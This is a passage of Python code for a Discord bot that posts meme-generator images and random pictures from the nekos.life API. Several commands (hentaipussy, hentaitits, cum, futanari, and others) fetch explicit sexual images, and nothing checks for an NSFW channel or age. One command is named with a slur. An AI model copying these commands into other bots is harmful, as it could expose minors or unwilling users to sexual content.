        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="yodawg <Text 1> <Text 2>", description="Xzibit Yo Dawg")
    async def yodawg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Xzibit Yo Dawg""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/yodawg/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="yuno <Text 1> <Text 2>", description="Y U NO Guy")
    async def yuno(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Y U NO Guy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/yuno/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="zerowing <Text 1> <Text 2>", description="All Your Base Are Belong to Us")
    async def zerowing(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""All Your Base Are Belong to Us""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/zero-wing/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)




    @React.command(usage="neko", description="Sends a random neko image")
    async def neko(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/neko')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Neko',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="achievement <Text>", description="Generates an Minecraft Achievement Get imagege")
    async def achievement(ctx, *, text):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Achievement',timestamp=embed_timestamp())
        embed.set_image(url=f"https://minecraftskinstealer.com/achievement/{random.randint(0, 40)}/Achievement+Get!/{urllib.parse.quote(text)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    
        
    @React.command(usage="spank", description="Shows a spank image")
    async def spank(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/spank')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Spank',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaipussy", description="Sends a random hentai pussy image")
    async def hentaipussy(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/pussy')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Pussy',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaikuni", description="Sends a random hentai kuni image")
    async def hentaikuni(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/kuni')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Kuni',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaitits", description="Sends a random hentai tits image")
    async def hentaitits(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/tits')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Tits',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaiketa", description="Sends a random hentai keta image")
    async def hentaiketa(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/keta')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Keta',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaikemonomimi", description="Sends a random hentai kemonomimi image")
    async def hentaikemonomimi(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/kemonomimi')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Kemonomimi',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="hentaigasm", description="Sends a random hentai gasm image")
    async def hentaigasm(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/gasm')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Gasm',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="goose", description="Sends a random goose image")
    async def goose(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/goose')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Goose',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="slap", description="Sends a random slap image")
    async def slap(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/slap')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Slap',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="pat", description="Sends a random pat image")
    async def pat(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/pat')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Pat',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="poke", description="Sends a random poke image")
    async def poke(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/poke')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Poke',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="tickle", description="Sends a random tickle image")
    async def tickle(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/tickle')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Tickle',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="cuddle", description="Sends a random cuddle image")
    async def cuddle(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/cuddle')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cuddle',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="smug", description="Sends a random smug image")
    async def smug(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/smug')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Smug',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="baka", description="Sends a random baka image")
    async def baka(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/baka')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Baka',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="futanari", description="Shows a futanari image")
    async def futanari(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/futanari')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Futanari',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="kiss", description="Sends a random kiss gif")
    async def kiss(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/kiss')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Kiss',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="cum", description="Shows a cum image")
    async def cum(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/cum')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cum',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="trap", description="Shows a trap image")
    async def trap(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/trap')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Trap',timestamp=embed_timestamp())
